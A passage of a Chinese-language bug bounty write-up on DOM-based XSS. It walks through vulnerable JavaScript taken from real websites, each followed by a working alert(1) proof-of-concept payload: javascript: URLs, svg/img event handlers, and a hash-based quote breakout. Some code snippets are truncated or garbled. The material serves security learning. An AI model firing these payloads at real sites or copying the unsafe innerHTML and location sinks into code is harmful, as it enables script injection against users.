前⾔
在参与BugBounty时，排⾏榜中有⼀些⼈分数很⾼，除了他很勤奋外，还有很好的⾃动化来发现资产中的漏洞，像h1这
种赏⾦平台竞争也很⼤，明显的漏洞⼏乎很少，要不资产独特，要不漏洞点很隐蔽，否则不容易发现,我在⼀开始接触
这个平台，因为xss最好上⼿，所以我花了很多时间在这上⾯，但是反射型xss很容易重复，因为其他⼈也很容易发现，
或者扫到，所以最开始那段时间，我把⽬光集中在Dom Xss上，并且制作了⾃动化来帮助我发现这种类型的漏洞，尽管
国内并不重视Xss，但是国外对于Xss的奖励还算可观，所以对于学习这个漏洞类型来说很有助⼒，因为有钱赚 (^-^)，
⽽且还有⼀些师傅不嫌弃的帮助，我⾮常感谢，所以我想分享⼀些⾃⼰在参与BugBounty遇到的Dom Xss，希望对于初
学者有帮助。
（本⽂不包含任何关于如何扫描Dom Xss的内容。） 
（很多案例已修复，所以只能从漏洞报告中找漏洞代码，或者通过Wayback Machine来寻找之前的源代码,经过⼀点点删
改。） 
（有些案例Dom很复杂也不典型，⽂章只分享⼀些经典案例，在挖洞时可能可以参考。） 
（尽管国外对Xss的奖励可观，但Xss依然属于中危级别漏洞，⽐SSRF,RCE,Sql注⼊这些，赏⾦通常还是很低，所以想要在
BugBounty中获得更多收⼊，还是需要关注研究⼀些⾼危害类型漏洞。未来可能会分享关于其他类型的。）
成果
为什么把成果放在最前⾯，因为我说了赚钱是助⼒，或者说动⼒，我是俗⼈，就是为了赚钱，🤣
我收到关于Dom Xss的赏⾦总计在 30000$ 左右，最⼩的 100$ ,最⼤的 3000$ ，⼤概70份报告，90%的结果来⾃⾃动化，
时间⼤概是2年，因为前期在优化改bug，我没有24⼩时天天扫描，我是偶尔导⼊⼀些⽬标来扫描，因为⼈太懒了+三⼼⼆意
+还有其他事情，断断续续的，隔⼀段时间搞⼀会。⾃动化是帮我找到可能的脆弱点，然后⼿动分析很快就可以得到结果。
案例
关于Dom xss，我很早之前还有⼀篇⽂章，那⾥也可以让你了解更多基础。 
以下所有案例来⾃真实⽹站。 
通常学习Dom Xss,找到的⽂章似乎是很明显的Dom xss。我也发现过，但是遇到的⼏率很⼩。 
例如
var url = window.location.href; 
        var newUrl = 'DjamLanding.aspx'; 
        var splitString = url.split('?url='); 
        if (splitString.length > 1) { 
            newUrl = splitString[1]; 
            window.top.location.href = newUrl; 
        } 
        else { 
            // New Url With NO query string 
            alert('NO query string'); 
        } 
        window.top.location.href = newUrl; 
这种很简单,直接分割 ?url= , 然后来跳转 
Payload https://test.com/xss?url=javascript:alert(1)
最常⻅的Case 1
概括：从URL中获取指定参数值，然后写⼊页⾯。 
这种类型重点是获取参数的⽅式 
1
    var getUrlParameter = function getUrlParameter(sParam) { 
        var sPageURL = window.location.search.substring(1), 
            sURLVariables = sPageURL.split('&'), 
            sParameterName, 
            i; 
        for (i = 0; i  
const posterElement = document.getElementById( 'poster-element' ) 
function getField( name ) { 
  let fname = document.getElementById( name ) 
  if( !fname ) fname = document.getElementById( 'data-' + name ) 
  let val 
  if( fname ) { 
    const isCheckbox = fname.matches( '[type="checkbox"]' ) 
    if( isCheckbox ) val = fname.checked 
    else val = fname.value || fname.content 
    // check for a hard true (from the checkbox) 
    if( val === true || (val && val.length > 0) ) return val 
    else { 
      val = getURLParameter( name ) 
      if( val && val.length > 0 ) { 
        if( isCheckbox ) fname.checked = !!val 
        else fname.value = val 
      } 
    } 
  } 
  return getURLParameter( name ) 
} 
 if( posterElement && !posterElement.src ) { 
    const posterSrc = getField( 'poster' ) || GLANCE.defaultPoster 
    if( posterSrc ) { 
      posterElement.src = posterSrc 
      posterElement.classList.remove( 'invisible' ) 
    } 
    else { 
      posterElement.classList.add( 'invisible' ) 
    } 
  } 
获取参数 poster 值设置为 posterElement.src ，也就是iframe标签src的值
Payload https://test.com/xss?poster=javascript:alert(1)
----- 3
function highlightSearchResults() { 
    const e = $(".content_block .content_container .content_block_text:last"); 
    layoutData.enableSearchHighlight && highlightSearchContent("highlight", e); 
    var t = getQueryParamByName("attachmentHighlight") || void 0; 
    t && $(".content_block_head").after("Please check the " + layoutData.attachments.toLowerCase() + " for matching keyword '" 
+ t + "' search result") 
} 
after() ⽅法在被选元素后插⼊指定的内容。 
获取参数 attachmentHighlight 值给 t ,通过 jQuery after() 写⼊
Payload https://test.com/xss?attachmentHighlight=%3Csvg%20onload=alert(1)%3E
----- 4 
这个报告中只有这张图⽚ 
流程是 
dev=params.get("dev")  > sessionStorage.setItem("braze-dev-version",dev)  > 
var version=sessionStorage.getItem("braze-dev-version")  > displayDevMessage(version)  > 
displayDevMessage(c) {var
a=document.createElement("div");a.innerHTML=c;document.body.appendChild(a);
Payload ?dev=%3Cimg%20src=x%20onerror=alert(1)%3E
由于它是储存在 sessionStorage ，然后再读取，所以这可以算是个持久Xss，访问poc后，访问任何加载此js的页⾯依然
会触发Xss
----- 5
let ghSource = getUrlParameter('gh_src'); 
for (var something in sorted) { 
    console.log(something); 
    // let options = 'All Categories' + something; 
    var sortedReplaced = replaceAll(something.replace(/\s/g, ''), '&', ''); 
    menuHtml.innerHTML += `${somethin
g}`; 
    // html += `No data` 
    html += `       ` 
    let categ = array[something]; 
    html += `` 
    let jobs = categ; 
    for (let j = 0; j  ${jobse.title}${locatio
n} 
                                            ` 
    } 
    html += `` 
    dataEl.innerHTML = html 
} 
获取参数 gh_src 通过 replaceAll 传给 url , url 写⼊a标签，但是获取参数解码了，所以还是会造成Xss.
Payload https://test.com/xss?gh_src=xsstest%22%3E%3Cimg%20src%3dx%20onerror%3dalert(1)%3E
常⻅的Case 2
概括：直接把location.href写⼊页⾯ 
此场景还是很常见的
如果你把 https://www.google.com/xsspath'"?xssparam'"=xssvalue'"#xsshash'" 放⼊浏览器URL栏 
你会得到 https://www.google.com/xsspath'%22?xssparam%27%22=xssvalue%27%22#xsshash'%22
从得到的结果来看，浏览器似乎只对 location.search 也就是参数中的单引号⾃动编码 
path 和 hash  都不会编码，所以可以利⽤hash逃出任何通过单引号引⽤并写⼊ location.href 或者 location.hash
的地⽅ 
因为修改 path ⼀般会导致页⾯404，极少数情况下才能使⽤，但是服务端代码在获取某个 path 写⼊页⾯的时候可能会造
成反射型Xss。
----- 1 
⽹页分享处，任何分享，⽹页分析创建的log请求 各种需要当前页⾯url的地⽅ 
像这样
   document.writeln("Twitter"); 
只需要通过 hash 跳出单引号，就可以添加js事件，根据具体标签具体分析，这⾥是a标签所以很多都可以⽤，onclick为举例
Payload https://test.com/xss#'onclick='alert(1)
----- 2 
⼀些表单提交处
            createInput: function(a) { 
                var b = "" 
                  , e = "" 
                  , c = a.fieldPrefix || ga 
                  , d = a.elementId || a.elementName 
                  , f = a.elementClasses && B(a.elementClasses) ? a.elementClasses : [] 
                  , g = "object" === typeof a.elementAttributes ? a.elementAttributes : 
{} 
                  , h = "button" === a.type || "submit" === a.type || "checkbox" === a.t
ype || "radio" === a.type || "hidden" === a.type 
                  , k = a.justElement || a.collection || "hidden" === a.type || "button" 
=== a.type || "submit" === a.type 
                  , l = "password" === a.type && !Bb && a.placeholder ? "text" : a.type 
                  , n = ("checkbox" === a.type && !a.collection || "radio" === a.type && 
!a.collection) && !a.justElement 
                  , m = a.rendererFieldName 
                  , p = a.rendererChildFieldName 
                  , t = Hc && !a.collection; 
                I(f, "capture_" + d) || f.push("capture_" + d); 